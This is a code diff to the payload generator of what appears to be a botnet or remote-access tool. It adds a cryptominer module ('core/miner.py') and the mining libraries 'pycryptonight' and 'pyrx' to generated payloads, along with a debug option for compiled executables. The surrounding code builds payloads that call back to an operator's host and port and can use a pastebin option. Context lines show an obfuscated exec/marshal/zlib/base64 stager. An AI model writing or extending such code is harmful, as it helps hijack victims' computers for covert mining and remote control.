@@ -175,6 +175,12 @@ def main():
                         help='compile client into a standalone executable for the current host platform',
                         default=False)
 
+    parser.add_argument('--debug',
+                        action='store_true',
+                        help='enable debugging output for frozen executables',
+                        default=False
+    )
+
     parser.add_argument(
         '-v', '--version',
         action='version',
@@ -205,7 +211,7 @@ def _modules(options, **kwargs):
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
 
-    modules = ['core/util.py','core/security.py','core/payloads.py']
+    modules = ['core/util.py','core/security.py','core/payloads.py', 'core/miner.py']
 
     if len(options.modules):
         for m in options.modules:
@@ -282,9 +288,17 @@ def _payload(options, **kwargs):
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
     assert 'imports' in kwargs, "missing keyword argument 'imports'"
 
-    loader  = '\n'.join((open('core/loader.py','r').read(), generators.loader(host=options.host, port=int(options.port)+2, packages=list(kwargs['hidden']))))
+#    loader  = '\n'.join((open('core/loader.py','r').read(), generators.loader(host=options.host, port=int(options.port)+2, packages=list(kwargs['hidden']))))
+    loader  = open('core/loader.py','r').read()
+    test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden']) if i not in ['StringIO','_winreg','pycryptonight','pyrx']])
+    potential_imports = '''
+try:
+    import pycryptonight
+    import pyrx
+except ImportError: pass
+'''
     modules = '\n'.join(([open(module,'r').read().partition('# main')[2] for module in kwargs['modules']] + [generators.main('Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()']))
-    payload = '\n'.join((loader, modules))
+    payload = '\n'.join((loader, test_imports, potential_imports, modules))
 
     if not os.path.isdir('modules/payloads'):
         try:
@@ -417,7 +431,7 @@ exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(
 
     if options.freeze:
         util.display('\tCompiling executable...\n', color='reset', style='normal', end=' ')
-        name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'])
+        name = generators.freeze('modules/payloads/' + kwargs['var'] + '.py', icon=options.icon, hidden=kwargs['hidden'], debug=options.debug)
         util.display('({:,} bytes saved to file: {})\n'.format(len(open(name, 'rb').read()), name))
     return name
 
